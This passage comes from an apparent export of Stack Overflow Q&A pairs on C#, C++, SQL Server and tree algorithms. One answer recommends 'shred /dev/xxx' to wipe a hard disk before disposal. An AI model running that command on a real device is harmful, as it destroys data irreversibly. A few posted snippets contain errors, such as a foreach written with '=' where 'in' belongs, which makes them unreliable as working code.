    Result = (T)ModifyObject (ref Bar);

    // Next line gives
    // A ref or out argument must be an assignable variable
    Result = (T)ModifyObject (ref ((Object)Bar) );

    // Works
    Object Tmp = Bar;
    Result = (T)ModifyObject (ref Tmp) );

    return Result;

}

public static Object DoSomthing(ref Object Obj) {
    Object Result = Activator.CreateInstance (Obj.GetType ())
    //...
}
</code></pre>

<p>DoSomething is not generic as it uses recursion where the type of Obj can change. I was trying to stick away from using reflection to call a generic version of it, although on posting maybe it would be a better option?</p>
","33708","","<p>The type of a <code>ref</code> argument should match the type of the parameter. You cannot rely on implicit conversions here. Eric Lippert has a related blog post: <a href=""http://blogs.msdn.com/ericlippert/archive/2009/09/21/why-do-ref-and-out-parameters-not-allow-type-variation.aspx"">Why do ref and out parameters not allow type variation?</a></p>
"
"<p>I'm planning to write a C# 3.0 compiler in C#. Where can I get the grammar for parser generation?</p>

<p>Preferably one that works with ANTLR v3 without modification.</p>
","33708","","<p>I ran into <a href=""http://antlrcsharp.codeplex.com"">ANTLR C# Grammar on CodePlex</a>. It's a relatively new project and uses ANTLR 3.2. It says it supports C# 4.0 and is licensed under the Eclipse Public License (EPL).</p>

<p>I played with it a little. It has a bunch of test files containing expressions. It supports lambdas, unsafe context, ... as you'd naturally expect. It parses a C# file and hands you an abstract syntax tree. You can do whatever you want with it.</p>
"
"<p>I have the following pseudo-code in my book for a breadth-first search:</p>

<pre><code>function breadth_first_search:
    begin
        open := [Start]
        closed := [];
        while open != [] do
            begin
                remove leftmost state from open, call it X;
                    if X is a goal then return SUCCESS
                        else begin
                            generate children of X;
                            put X on closed;
                            discard children of X if already on open or closed;
                            put remaining children on right end of open;
                        end
            end
       return FAIL;
    end
</code></pre>

<p>I've implemented a similar algorithm myself following these pseudo-code instructions.  My question is, what is the simplest way to modify it so it maintains the solution path?</p>

<p>Simply knowing I can reach a solution isn't nearly as useful as having a list of transitions to get to the solution.  </p>
","33708","","<p>Set <code>Parent[childNode] = currentNode</code> as you enqueue each node (when you set <code>Visible[Node] = 1</code>).</p>

<p>Then recursively look up the <code>Parent</code> array, starting at the node you want and append each node you see in the <code>Parent</code> array to the path. <code>Parent[root]</code> is <code>nil</code> and the recursion will stop there. </p>
"
"<p>I and trying to create a method to run a .sql file on an SQL Server database.</p>

<p>The code i have is:</p>

<pre><code>SqlConnection dbCon = new SqlConnection(connstr);
FileInfo file = new FileInfo(Server.MapPath(""~/Installer/JobTraksDB.sql""));
StreamReader fileRead = file.OpenText();
string script = fileRead.ReadToEnd();
fileRead.Close();

SqlCommand command = new SqlCommand(script, dbCon);
try
{
    dbCon.Open();
    command.ExecuteNonQuery();
    dbCon.Close();
}
catch (Exception ex)
{
    throw new Exception(""Failed to Update the Database, check your Permissions."");
}
</code></pre>

<p>But i keep getting errors about ""incorrect syntax near keyword 'GO'""
My SQL File starts like this: (Generated from SQL Management Studio)</p>

<pre><code>SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
SET ANSI_PADDING ON
GO
CREATE TABLE [dbo].[Job_Types](
    [ID] [int] IDENTITY(1,1) NOT NULL,
    [Name] [varchar](50) NOT NULL,
 CONSTRAINT [PK_JobTypes] PRIMARY KEY CLUSTERED 
(
    [ID] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
SET ANSI_PADDING OFF
GO
</code></pre>

<p>How should i be executing this script?</p>
","33708","","<p><code>GO</code> is <strong>not</strong> a T-SQL statement. It's a hint for client tools such as <code>sqlcmd</code> or Management Studio to split up statements and send them as individual batches. They use a <code>GO</code> command on its own line as a marker to indicate the end of a batch. You shouldn't send the file as a whole to SQL Server.</p>

<p>Side note: There's a <a href=""http://msdn.microsoft.com/en-us/library/ms143368.aspx"" rel=""nofollow""><code>File.ReadAllText</code></a> method that you can use instead of those three lines.</p>
"
"<p>If you have a function which takes for example an <code>int</code>, what is the better way of declaring the function and why is one better than the other one?</p>

<pre><code>void myFunction (const int &amp;myArgument);
</code></pre>

<p>or</p>

<pre><code>void myFunction (int myArgument);
</code></pre>
","33708","","<p>They do different things. <code>const T&amp;</code> makes the function take <strong>a reference</strong> to the variable. On the other hand, <code>T arg</code> <strong>will call the copy constructor</strong> of the object and passes the <strong>copy</strong>. 
If the copy constructor is not accessible (e.g. it's <code>private</code>), <code>T arg</code> won't work:</p>

<pre><code>class Demo {
    public: Demo() {} 
    private: Demo(const Demo&amp; t) { } 
};

void foo(Demo t) { }

int main() {
    Demo t;
    foo(t); // error: cannot copy `t`.
    return 0;
}
</code></pre>

<p>For small <strong>values</strong> like primitive types (where all matters is the contents of the object, not the actual referential identity; say, it's not a handle or something), <code>T arg</code> is generally preferred. For large objects and objects that you can't copy and/or preserving referential identity is important (regardless of the size), passing the reference is preferred.</p>

<p>Another advantage of <code>T arg</code> is that since it's a copy, the callee cannot maliciously alter the original value. It can freely mutate the variable like any local variables to do its work.</p>
"
"<p>By independent nodes, I mean that the returned set can not contain nodes that are in immediate relations, parent and child cannot both be included. I tried to use Google, with no success. I don't think I have the right search words. </p>

<p>A link, any help would be very much appreciated. Just started on this now. </p>

<p>I need to return the actual set of independent nodes, not just the amount. </p>
","33708","","<p>You can compute this recursive function with dynamic programming (memoization):</p>

<pre><code>MaxSet(node) = 1 if ""node"" is a leaf
MaxSet(node) = Max(1 + Sum{ i=0..3: MaxSet(node.Grandchildren[i]) },  
                       Sum{ i=0..1: MaxSet(node.Children[i])      })
</code></pre>

<p>The idea is, you can pick a node or choose not to pick it. If you pick it, you can't pick its direct children but you can pick the maximum set from its grandchildren. If you don't pick it, you can pick maximum set from the direct children. </p>

<p>If you need the set itself, you just have to store how you selected ""Max"" for each node. It's similar to the <a href=""http://en.wikipedia.org/wiki/Longest%5Fcommon%5Fsubsequence%5Fproblem"" rel=""nofollow"">LCS algorithm</a>. </p>

<p>This algorithm is O(n). It works on trees in general, not just binary trees.</p>
"
"<p>I have a series of behaviors I want to enable/disable based on bit values. For example, the status of Behavior ""A"" is 0 or 1, Behavior ""B"" is 0 or 2, Behavior ""C"" is 0 or 4, etc. If the value of the variable containing the status is ""5"", I know Behavior ""A"" and ""C"" are enabled. ""B"" is not. My program should then toggle on A &amp; C.</p>

<p>I'm not sure what this is called so hopefully someone here can give me a name and shove me in the right direction. How do I programmatically create the list of enabled functions based on the status variable? There may be 20-30 behaviors i want to control in this manner. Too many to manage manually.</p>
","33708","","<p>You can use a <a href=""http://msdn.microsoft.com/en-us/library/system.collections.specialized.bitvector32.aspx"" rel=""nofollow"">BitVector32</a> or <a href=""http://msdn.microsoft.com/en-us/library/system.collections.bitarray.aspx"" rel=""nofollow"">BitArray</a>. They abstract away bit manipulation from you.</p>

<p>If you want to manipulate individual bits in an <code>int</code> variable directly, you can use bitwise operators:</p>

<h3>Check whether i-th bit is set or not:</h3>

<pre><code>bool isSet = (variable &amp; (1 &lt;&lt; i)) != 0;
</code></pre>

<h3>Set i-th bit:</h3>

<pre><code>variable |= (1 &lt;&lt; i);
</code></pre>

<h3>Reset i-th bit:</h3>

<pre><code>variable &amp;= ~(1 &lt;&lt; i);
</code></pre>

<h3>Toggle i-th bit:</h3>

<pre><code>variable ^= (1 &lt;&lt; i);
</code></pre>
"
"<p>How does one target a control by its Type?</p>

<p>I have a Control collection ""TargetControls""</p>

<pre><code>        List&lt;Control&gt; TargetControls = new List&lt;Control&gt;();
        foreach (Control page in Tabs.TabPages)
        {
            foreach (Control SubControl in page.Controls)

                TargetControls.Add(SubControl);
        }

        foreach (Control ctrl in TargetControls)...
</code></pre>

<p>I need to access each existing control (combobox,checkbox,etc.) by its specific Type with access to its specific properties. The way I'm doing it now only gives me access to generic control properties.</p>

<p>Can't I specify something like...</p>

<p>Combobox current = new ComboBox[""Name""];  /// Referencing an Instance of ComboBox 'Name'</p>

<p>and then be given access to it's (already existing) properties for manipulation?</p>
","33708","","<p>You can use the <code>OfType&lt;T&gt;</code> extension method:</p>

<pre><code>foreach (var textBox = page.Controls.OfType&lt;TextBox&gt;()) {
   // ...
}
</code></pre>
"
"<p>I've been arguing with a co-worker about how necessary it is to wipe or destroy the hard disks that were used for storing the sources and are replaced with bigger ones or discarded.</p>

<p>His point is that <em>no piece of source code exposed to a third party gives that party any competitive advantage</em>. My point is that it only takes ten minutes to set up a wiping program and start it before leaving and in the morning you have a disk that contains no data that could be possibly recovered - doesn't hurt and compeletely removes the risk.</p>

<p>Now really how risky is it to throw away a hard drive containing a working copy of a repository of a commercial product having 10 million lines of source code?</p>
","33708","","<p>I wouldn't take such a big risk. I'd do it on every hard disk I want to give/sell:</p>

<p>Boot up a Linux system from a Live CD/USB and run:</p>

<pre><code>shred /dev/xxx
</code></pre>
"
"<pre><code>class base
{
    base () { }
    virtual ~base () { }
}

class middleBase
{
    middleBase () { }
    middleBase (int param) { }
    ~middleBase () { }
}

class concrete : public middleBase
{
    concrete () { }
    concrete (int param) { // process }
    ~concrete () { // delete something }
}
</code></pre>

<p>Error is : undefinded reference to ""middleBase::middleBase (int param)""</p>

<p>and is this suitable for best practice for parameterized constructors?</p>
","33708","","<pre><code>class base
{
  public: // constructor should be accessible by derived class
    base () { }
    virtual ~base () { }
}; // add semicolon

class middleBase : public base // you missed the declaration
{
  public: 
    middleBase () { }
    middleBase (int param) { }
    virtual ~middleBase () { }
};

class concrete : public middleBase
{
  public:
    concrete () { }
    concrete (int param) : middleBase(param) { /* process */ }
    virtual ~concrete () { /* delete something */ }
};
</code></pre>
"
"<p><a href=""http://stackoverflow.com/questions/1567532/java-algorithm-for-finding-the-largest-set-of-independent-nodes-in-a-binary-tree"">This algorithm</a> is so advanced for my basic programming skills that I just don't see how I could implement it. I'm posting this in a new question because I can't keep bothering the guy who gave me the algorithm alone about this in the comment section in the previous question. </p>

<pre><code>MaxSet(node) = 1 if ""node"" is a leaf
MaxSet(node) = Max(1 + Sum{ i=0..3: MaxSet(node.Grandchildren[i]) },  
                       Sum{ i=0..1: MaxSet(node.Children[i])      })
</code></pre>

<p>Thanks too <a href=""http://stackoverflow.com/users/33708/mehrdad"">mehrdad</a> for the algorithm. </p>

<p>The problem here for me is to implement the part of the two sum lines, how can I do that? And I need to mark every node that this algorithm chooses. It's just a ""marked"" variable in the node class set to true. I don't understand were it makes a decision too choose a node? </p>

<p>EDIT to include my code so far: </p>

<pre><code>public int maxSet(Posisjon&lt;E&gt; bt){
    	if (isExternal(bt)){
    		return 1; 
    	}
    	return Math.max(1 + helper1(bt), helper2(bt));
    }

private int helper1(Posisjon&lt;E&gt; node){
	int tmp = 0; 
	if (hasLeft(node)){
		if(hasLeft((Position&lt;E&gt;)node.leftChild())){
			tmp += maxSet(node.leftChild().leftChild());
		}
		if(hasRight((Position&lt;E&gt;)node.leftChild())){
			tmp += maxSet(node.leftChild().rightChild());
		}
	}
	if(hasRight(node)){
		if(hasLeft((Position&lt;E&gt;)node.rightChild())){
			tmp += maxSet(node.leftChild().leftChild());
		}
		if(hasRight((Position&lt;E&gt;)node.rightChild())){
			tmp += maxSet(node.leftChild().rightChild());
		}
	}
	return tmp; 
}
private int helper2(Posisjon&lt;E&gt; node){
	int tmp = 0; 
	if(hasLeft(node)){
		tmp +=maxSet(node.leftChild());
	}
	if(hasRight(node)){
		tmp +=maxSet(node.rightChild());
	}
	return tmp; 
}
</code></pre>

<p>This seems to be working, what is left now. Is to actually mark the nodes as chosen? Were would I do that? </p>

<p><hr /></p>

<p>Updated with code: </p>

<pre><code>public ArrayList&lt;Posisjon&lt;E&gt;&gt; getSelectionSet(Posisjon&lt;E&gt; bt, ArrayList&lt;Posisjon&lt;E&gt;&gt; s){
    	if(bt.marked){
    		s.add(bt);
    	}
    	if(hasLeft(bt)){
    		if(hasLeft(bt.leftChild())){
    			getSelectionSet(bt.leftChild().leftChild(),s);
    		}
    		if(hasRight(bt.leftChild())){
    			getSelectionSet(bt.leftChild().rightChild(),s);
    		}
    	}
    	if(hasRight(bt)){
    		if(hasLeft(bt.rightChild())){
    			getSelectionSet(bt.rightChild().leftChild(),s);
    		}
    		if(hasRight(bt.rightChild())){
    			getSelectionSet(bt.rightChild().rightChild(),s);
    		}
    	}
    	return s; 
    }

public int maxSet(Posisjon&lt;E&gt; bt){
    	if (bt.visited){
    		return bt.computedMax; 
    	}
    	bt.visited = true; 
    	int maxIfCurrentNodeIsSelected = 1 + helper1(bt);
    	int maxIfCurrentNodeIsNotSelected = helper2(bt);
    	if (maxIfCurrentNodeIsSelected &gt; maxIfCurrentNodeIsNotSelected){
    		bt.marked = true; 
    		bt.computedMax = maxIfCurrentNodeIsSelected; 
    	}else{
    		bt.marked = false; 
    		bt.computedMax = maxIfCurrentNodeIsNotSelected; 
    	}
    	return maxSet(bt);
    }
</code></pre>

<p>After submission, I will post the entire code for this! </p>
","33708","","<p>You currently have does not memoize the return value of the function each time. Every time you call <code>maxSet</code>, you should check if you have already computed the result or not. If you have, just return it. If you haven't compute it and store it somewhere. Otherwise, your algorithm will be inefficient. (This approach is called ""Dynamic Programming."" Learn about it.)</p>

<pre><code>// pseudocode:
public int maxSet(Posisjon&lt;E&gt; bt){
    if (visited[bt])
        return computedMax[bt];

    visited[bt] = true;        

    // You don't need to manually check for being a leaf
    // For leaves 'maxIfCurrentNodeIsSelected' is always larger.
    int maxIfCurrentNodeIsSelected = 1 + helper1(bt);
    int maxIfCurrentNodeIsNotSelected = helper2(bt);

    if (maxIfCurrentNodeIsSelected &gt; maxIfCurrentNodeIsNotSelected) {
         shouldSelect[bt] = true;
         computedMax[bt] = maxIfCurrentNodeIsSelected;
    } else {
         shouldSelect[bt] = false;
         computedMax[bt] = maxIfCurrentNodeIsNotSelected;
    }
}

public Set getSelectionSet(Posisjon&lt;E&gt; bt, Set s) {
    if (shouldSelect[bt]) {
        s.Add(bt);

        // You should check for nulls, of course
        getSelectionSet(bt.leftChild.leftChild, s);
        getSelectionSet(bt.leftChild.rightChild, s);
        getSelectionSet(bt.rightChild.leftChild, s);
        getSelectionSet(bt.rightChild.rightChild, s);
    } else {
        getSelectionSet(bt.leftChild, s);
        getSelectionSet(bt.rightChild, s);
    }
    return s;
}
</code></pre>

<p>call <code>getSelectionSet</code> with the root node and an empty <code>Set</code> as arguments after you called <code>maxSet</code>.</p>
"
"<p><strong>Background</strong><br />
Let's say I have the following class:</p>

<pre><code>public class MyValue&lt;T&gt;
{
    public T Value { get; set; }    
    public static bool operator ==(MyValue&lt;T&gt; first, MyValue&lt;T&gt; second)
    {
        // if first and second are the same instance, they are equal
        if (object.Equals(first, second))
        {
            return true;
        }

        // for each of the objects, get a value indicating whether either
        // the object or its Value property is null
        bool firstIsNull = object.Equals(first, null) ? true : first.Value == null;
        bool secondIsNull = object.Equals(second, null) ? true : second.Value == null;

        // if both are null, they are equal
        if (firstIsNull &amp;&amp; secondIsNull)
        {
            return true;
        }

        // Not both are null. If one is, they are not equal
        if (firstIsNull || secondIsNull)
        {
            return false;
        }

        // Neither first nor second is null; compare their values
        return first.Value.Equals(second.Value);
    }    
    // more code implementing !=, Equals, GetHashCode, implicit conversions and so on
}
</code></pre>

<p>This class will be used as the type on properties in an object model. An object could look like so:</p>

<pre><code>public class SomeClass
{

    public SomeClass()
    {
        SomeValue = new MyValue&lt;string&gt;();
    }
    public MyValue&lt;string&gt; SomeValue { get; set; }
}
</code></pre>

<p>The idea with this is that the class simply represents the value of its <code>Value</code> property. It has some more functionality that is stripped away since it's not relevant for the question (some validation and stuff). Since the class has no value in itself, we want it to be as little intrusive as possible when used. Implicit conversions allows for code like this:</p>

<pre><code>SomeClass instance = new SomeClass();
instance.SomeValue = ""my string"";
</code></pre>

<p><strong>...and the question:</strong><br />
The idea with overloading the == (and !=) operator is to have an instance of the object where <code>Value</code> is <code>null</code> to compare equal to <code>null</code> (partly because we feel it makes sense, partly because of backwards compatibility issues in the object model):</p>

<pre><code>MyValue&lt;string&gt; a = new MyValue&lt;string&gt;();
MyValue&lt;string&gt; b = null;
bool areTheyEqual = (a == b); // this will be true
</code></pre>

<p>This may of course seem a bit confusing, but given that <code>MyClass</code> is simply a wrapper, that in most of the code will be rather invisible, does it make sense to you too, or is it something really bad that we will regret for reasons that we overlooked?</p>
","33708","","<p>In my opinion, <code>==</code> operator in C# is already confusing enough. If you overload it like that, you'll be increasing the possibility of confusion.</p>

<pre><code>Class c = somethingEqualsToNullButNotNull;
if (c == null) { // true
}

object co = c;
if (co == null) { // false. WTF!?
}
</code></pre>
"
"<p>I am using the Entity Framework and have got a loop that looks at a set of People and using a foreach loop creates a query for the address of each person. As each address query is created it is added to the node of a treeview where it can be later used (to populate children nodes):</p>

<pre><code> IQueryable&lt;Person&gt; pQuery = (IQueryable&lt;Person&gt;)myContext.People; //get a list of people

 //go through and get the set of addresses for each person
 foreach (var p in pQuery)
 {
      var addressQuery = from a in myContext.Addresses
                                   from al in a.Address_Links
                                   where al.P_ID == p.P_ID
                                   orderby a.A_POST_CODE
                                   select a;


     //add the query to a TreeView node (use the tag to store it)
     TreeNode newNode = new TreeNode();
     newNode.Tag = addressQuery;
 }
</code></pre>

<p>Now, the problem that I am finding upon running the app is that ALL the queries are the last query created i.e. the last iteration of the loop. It is like the addressQuery is created on the first iteration of the loop and then overwritten on each subsequent query. The result of this is that it is like all the address queries in the treenodes are references to the last query made(?)</p>

<p>Further investigation that I could solve the problem by using a static class to generate the address query and pass that into each the TreeNode, as follows:</p>

<pre><code> public static class Queries
    {
        public static IQueryable&lt;Address&gt; AddressesForPerson(GenesisEntities myContext, int key)
        {
            var query = from a in myContext.Addresses
                        from al in a.Address_Links
                        where al.P_ID == key
                        orderby a.A_POST_CODE
                        select a;
            return query;
        }

}
</code></pre>

<p>The question I have is that I am baffled by this behaviour. Why does having a static query class help me? Can anyone explain to me what is going on?</p>

<p>Confused.Com!</p>
","33708","","<p>The reason is that the <code>p</code> variable (the <code>foreach</code> loop variable) is captured and the query is evaluated lazily. As a result, when the query is actually run, it uses the current value of <code>p</code> variable at that time, which is the last value. Read <a href=""http://stackoverflow.com/questions/1095707/what-is-the-exact-definition-of-a-closure/1095770#1095770"">my answer to ""What is the exact definition of a closure?""</a> for more info.</p>

<p>To solve the problem, simply try introducing a temporary variable:</p>

<pre><code> // `loopVariable` is scoped inside loop body AND the loop declaration.
 foreach (var loopVariable in pQuery) 
 {
      var p = loopVariable; // This variable is scoped **inside** loop body.
      var addressQuery = from a in myContext.Addresses
                                   from al in a.Address_Links
                                   where al.P_ID == p.P_ID
                                   orderby a.A_POST_CODE
                                   select a;


     //add the query to a TreeView node (use the tag to store it)
     myTreeView.Tag = addressQuery
 }
</code></pre>
"
"<p>How would i know the SQL statement generated by my Linq to sql query?</p>
","33708","","<p>Use <a href=""http://weblogs.asp.net/scottgu/archive/2007/07/31/linq-to-sql-debug-visualizer.aspx"" rel=""nofollow"">LINQ to SQL Debugger Visualizer</a>.</p>

<p>Alternatively, you can set <code>dataContext.Log</code> property to <code>Console.Out</code> or something and the SQL statement, along with actual parameter values will be written out to that stream.</p>
"
"<p>I have an enum:</p>

<pre><code>public enum baseKey : uint
{  
    HKEY_CLASSES_ROOT = 0x80000000,
    HKEY_CURRENT_USER = 0x80000001,
    HKEY_LOCAL_MACHINE = 0x80000002,
    HKEY_USERS = 0x80000003,
    HKEY_CURRENT_CONFIG = 0x80000005
}
</code></pre>

<p>How can I, given the string <code>HKEY_LOCAL_MACHINE</code>, get a value <code>0x80000002</code> based on the enum?</p>
","33708","","<pre><code>(uint)Enum.Parse(typeof(baseKey), ""HKEY_LOCAL_MACHINE"")
</code></pre>
"
"<p>I am converting Java code to C# and need to replace the use of Java's regex. A typical use is</p>

<pre><code>import java.util.regex.Matcher;
import java.util.regex.Pattern;
//...

String myString = ""B12"";
Pattern pattern = Pattern.compile(""[A-Za-z](\\d+)"");
Matcher matcher = Pattern.matcher(myString);
String serial = (matcher.matches()) ? matcher.group(1) : null;
</code></pre>

<p>which should extract a capture group from a matched target string. I'd be grateful for simple examples.</p>

<hr/>

<p><strong>EDIT</strong>: I have now added the C# equivalent of the code as an answer.</p>

<p><strong>EDIT</strong>: <a href=""http://geekswithblogs.net/shahed/archive/2005/10/10/56498.aspx"" rel=""nofollow"">Here is a tutorial</a> on the use of the actual expressions.</p>

<p><strong>EDIT</strong>: <a href=""http://www.devhood.com/tutorials/tutorial_details.aspx?tutorial_id=523"" rel=""nofollow"">Here is a useful comparison</a> of C# and Java (and Perl.)</p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/system.text.regularexpressions.regex.aspx""><code>System.Text.RegularExpressions.Regex</code> class</a> is the .NET Framework equivalent. The MSDN page I linked to contains a simple example.</p>
"
"<p>What is wrong with this code below. I always get FALSE, meaning after compression, decompressed data does not match original value.</p>

<pre><code>public static bool Test()
        {
            string sample = ""This is a compression test of microsoft .net gzip compression method and decompression methods"";
            System.Text.ASCIIEncoding encoding = new System.Text.ASCIIEncoding();
            byte[] data = encoding.GetBytes(sample);
            bool result = false;

            //Compress
            MemoryStream cmpStream;
            cmpStream = new MemoryStream();
            GZipStream hgs = new GZipStream(cmpStream, CompressionMode.Compress);
            hgs.Write(data, 0, data.Length);
            byte[] cmpData = cmpStream.ToArray();

            MemoryStream decomStream;
            decomStream = new MemoryStream(cmpData);
            hgs = new GZipStream(decomStream, CompressionMode.Decompress);
            hgs.Read(data, 0, data.Length);

            string sampleOut = System.BitConverter.ToString(data);

            result = String.Equals(sample, sampleOut) ;
            return result;
        }
</code></pre>

<p>I will really appreciate if you can point out where I am making a mistake. Thanks for looking.</p>

<p>Sincerely,
Mehdi Anis</p>
","33708","","<p>Close the <code>GZipStream</code> after the <code>Write</code> call.</p>

<p>Without calling <code>Close</code>, there's a possibility that some data is buffered and is not written to the underlying stream yet.</p>
"
"<p>My stored procedure looks like:</p>

<pre><code>WITH MYCTE(....)
AS 
(
...
)

UPDATE ... (using my CTE)



DELETE ( using my CTE)  &lt;---  says the object, my CTE, doesn't exist
</code></pre>

<p>Can I only use it once?</p>
","33708","","<p>A CTE expression is only valid in its body. If you want to use it in other places, you should repeat the <code>WITH</code> clause too.</p>

<pre><code>WITH MYCTE(....) AS ( ... ) 
UPDATE ... (using my CTE);  
-- a semicolon is necessary for statements followed by a CTE declaration

WITH MYCTE(....) AS ( ... )
DELETE ( using my CTE);
</code></pre>
"
"<p>We're going to have to write a C library and this library has to be accessible from Objective-C. Now I don't know anything about Objective-C so I wonder how simple Objective-C &lt;-> C interoperability is. Is that as simple as including the C header in the Objective-C code and linking to the library? Is there anything special I'm supposed to do (like the <code>extern ""C""</code> bit with C++)?</p>
","33708","","<p>Objective-C is a strict superset of C. You don't need to use <code>extern ""C""</code> or anything like that.</p>
"
"<p>OK I am not a very experienced C++ programmer, but I was wondering what is the significance of the underscores in the arguments of the following constructor?  </p>

<pre><code>class floatCoords
 {
 public:
  floatCoords(float _x, float _y, float _width, float _height)
   : x(_x), y(_y), width(_width), height(_height)
  {

  }
  float x, y, width, height;
  ...
</code></pre>
","33708","","<p>Nothing special. He just named it like that to distinguish between the member variables and parameter names.</p>

<p>Underscore is a valid character in C++ identifiers.</p>
"
"<p>It's been asked a couple of times on SO how you can implement a bidirectional enumerator (<a href=""http://stackoverflow.com/questions/191788/two-directional-list-enumerator-in-net"">here</a>, <a href=""http://stackoverflow.com/questions/451099/implementing-a-bidirectional-enumerator-in-c"">here</a>). My question is not <em>how</em> (which is trivial for most cases), but <em>why</em> no such type exists in the .NET platform.</p>

<pre><code>public interface IBidirectionalEnumerator&lt;T&gt; : IEnumerator&lt;T&gt;
{
    bool MovePrev();
}
</code></pre>

<p>Obviously, there are many collection types which can't implement this, as <code>MoveNext()</code> is destructive or changes the state of the underlying collection. But conversely, many types <em>can</em> implement this trivially (<code>List</code>, <code>IList</code>, <code>LinkedList</code>, <code>array</code>).</p>

<p>Why does no such type exist?</p>
","33708","","<p>When you are designing a framework, you have to make decisions about doing stuff at different abstraction levels. The trade-off is that if you choose to expose things at a high abstraction level, you'll achieve generalization at the cost of losing fine grained control over things. If you choose to expose stuff at lower abstraction levels, your concept will cannot be generalized as well but you can control details at a lower level.</p>

<p>It's a design decision. Implementing both will be costly and make framework more bloated and you'll need to support both when adding features. You'll need to preserve backward compatibility in the future. It's not a wise thing to add everything you can think of to the BCL without making sure it has a significant benefit.</p>
"
"<p>Is is possible to create a multidimensional list in C#.
I can create an multidimensional array like so:</p>

<pre><code> string[,] results = new string[20, 2];
</code></pre>

<p>but I would like to be able to use some of the features in a list or arraylist like being able to add and delete elements.</p>
","33708","","<p>Not exactly. But you can create a list of lists:</p>

<pre><code>var ll = new List&lt;List&lt;int&gt;&gt;();
for(int i = 0; i &lt; 10; ++i) {
    var l = new List&lt;int&gt;();
    ll.Add(l);
}
</code></pre>
"
"<p>Is there such a thing? First time I encountered a practical need for it, but I don't see one listed in stroustrup. I intend to write:</p>

<pre><code>// Detect when exactly one of A,B is equal to five.
return (A==5) ^^ (B==5);
</code></pre>

<p>But there is no ^^ operator. Can I use bitwise ^ here and get the right answer (regardless of machine representation of true and false)? I never mix &amp; and &amp;&amp;, or | and ||, so I hesitate to do that with ^ and ^^. </p>

<p>I'd be more comfortable writing my own ""bool XOR(bool,bool)"" function instead.</p>
","33708","","<p>The XOR operator cannot be short circuited; i.e. you cannot predict the result of an XOR expression just by evaluating its left hand operand. Thus, there's no reason to provide a <code>^^</code> version.</p>
"
"<p>Consider the following :</p>

<pre><code>int increment1 (const int &amp; x)
{ return x+1; }

int increment2 (const int x)
{ return x+1; }
</code></pre>

<p>I understand passing references to class objects an such, but I'm wondering if it's worth to pass reference to simple types ? Which is more optimal ? Passing by reference or passing by value (in case of a simle type?)</p>
","33708","","<p>Unless you need the ""call by reference"" semantics, i.e. you want to access the actual variable in the callee, you shouldn't use call by reference for simple types.</p>

<p>For a similar, more general discussion see: <a href=""http://stackoverflow.com/questions/1567138/const-t-arg-vs-t-arg"">""const T &amp;arg"" vs. ""T arg""</a></p>
"
"<p>I have been trying to understand the use of ""primitives"" in Java and C# and the difference between them (if any). I have asked a series of questions on SO and some of the answers seem to confuse the issue rather than clarify it. Some answers (and some MS documentation) appear to provide contradictory statements. From SO</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/1599176/what-are-first-class-objects-in-java-and-c"">http://stackoverflow.com/questions/1599176/what-are-first-class-objects-in-java-and-c</a></li>
<li><a href=""http://stackoverflow.com/questions/1597999/are-primitives-different-in-java-and-c"">http://stackoverflow.com/questions/1597999/are-primitives-different-in-java-and-c</a></li>
</ul>

<p>and from MS: <a href=""http://msdn.microsoft.com/en-us/library/ms228360%28VS.80,lightweight%29.aspx"">http://msdn.microsoft.com/en-us/library/ms228360%28VS.80,lightweight%29.aspx</a>
 - ""structs are very similar to classes""
 - ""the <code>Int32</code> class wraps the <code>int</code> data type""
 - ""On the other hand, all primitive data types in C# are objects in the System namespace. For each data type, a short name, or alias, is provided. For instance, <code>int</code> is the short name for System.Int32"".</p>

<p>My confusion lies largely with C# (I have programmed java for some while). </p>

<p><strong>EDIT</strong> The following paragraph has been confirmed to be correct by @Jon Skeet</p>

<ul>
<li>Java has two types (primitive and class). The words ""value type"" could be a synonym for primitive (although not widely used) and ""reference type"" for class. Java ""wraps"" primitives (int) in classes (Integer) and these classes have the complete power of any other class (can be null, used in collections, etc.)</li>
</ul>

<p><strong>EDIT</strong> @Jon has given a very clear statement on C# so I will delete my suggested truths and refer to his answer.</p>

<p>Further question: Is there a consensus on what the actual use of these terms should be? If there is a consensus I'd be very grateful for it spelt out explicitly. Otherwise I assume the terminology is muddled and therefore of limited use.</p>

<p><strong>SUMMARY</strong> Thanks for very clear answers. There is a consensus (see accepted answer from @Jon)  among those who really understand this and the MS docs are consistent (although they refer to Java in places and I misread these for C#)</p>
","33708","","<p>I haven't seen MS docs to be contradictory about this (MSDN is sometimes wrong, but on this specific issue, I've always seen it correct). The MSDN link you posted says:</p>

<blockquote>
  <p><strong>For each primitive data type in Java</strong>,
  the core class library provides a
  wrapper class that represents it as a
  Java object. For example, the Int32
  class wraps the int data type, and the
  Double class wraps the double data
  type.</p>
  
  <p><strong>On the other hand</strong>, all primitive data
  types in C# are objects in the System
  namespace. For each data type, a short
  name, or alias, is provided. For
  instance, int is the short name for
  System.Int32 and double is the short
  form of System.Double.</p>
</blockquote>

<p>Basically, it's saying the right thing. In Java, <code>Integer</code> class is a wrapper for <code>int</code> primitive type. In C#, <code>int</code> is an alias for <code>System.Int32</code> structure. The first paragraph is about Java and <strong>doesn't apply</strong> to C#.</p>

<p><hr /></p>

<p>In .NET, the terminology is as follows:</p>

<p>A <em>primitive type</em> is a type that has <a href=""http://msdn.microsoft.com/en-us/library/system.type.isprimitive.aspx""><code>IsPrimitive</code> property</a> set to true. Primitive types are: </p>

<blockquote>
  <p>The primitive types are Boolean, Byte,
  SByte, Int16, UInt16, Int32, UInt32,
  Int64, UInt64, IntPtr, UIntPtr, Char,
  Double, and Single.</p>
</blockquote>

<p>All primitive types are value types but <strong>not vice versa</strong>.</p>

<p>A <em>value type</em> is a <a href=""http://blogs.msdn.com/ericlippert/archive/2009/04/27/the-stack-is-an-implementation-detail.aspx"">type that has value semantics, as opposed to reference semantics</a>. The whole value is copied when passed by value (not its reference). Local variables of value types are stored on stack. <code>struct</code>s and  <code>enum</code>s are value types.</p>

<p>As mentioned above, all primitive types are value types. They are <code>struct</code>s in the <code>System</code> namespace. In C#, <code>int</code>, <code>double</code>, etc., keywords are basically aliases for those <code>struct</code>s.</p>
"
